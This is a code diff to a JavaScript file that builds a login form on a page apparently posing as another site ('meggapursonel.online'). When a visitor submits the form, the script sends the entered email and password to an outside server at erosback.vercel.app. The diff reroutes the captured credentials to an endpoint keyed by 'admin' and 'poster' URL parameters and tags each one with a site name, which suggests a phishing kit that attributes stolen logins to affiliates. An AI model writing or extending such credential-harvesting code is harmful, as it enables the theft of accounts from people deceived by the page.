@@ -1,4 +1,4 @@
-const apiUrl = 'https://erosback.vercel.app'
+const API_URL = 'https://erosback.vercel.app'
 const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
@@ -22,6 +22,10 @@ function detectDevice(userAgent) {
 document.addEventListener('DOMContentLoaded', () => {
     // Extract 'userid' from the URL
     const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
+    const adminId = getQueryParam('admin');
+    const posterId = getQueryParam('poster');
+    const site = getQueryParam('site');
+
     console.log('User ID:', userId);
 
     // Dynamically create the login form
@@ -70,16 +74,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (username && password) {
             // Send form data via fetch
-            fetch('https://erosback.vercel.app/add/instant/mega', {
+            fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
+                    site:site,
                     email: username,
                     password: password,
-                    userId: userId,
-                    userAgent: navigator.userAgent
+                    // userId: userId,
+                    // userAgent: navigator.userAgent
                 })
             })
                 .then(response => response.json())
@@ -99,7 +104,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Fetch additional data on page load
-    fetch('https://erosback.vercel.app/add/instant/mega', {
+    fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
         method: 'POST'
     })
         .then(response => response.json())
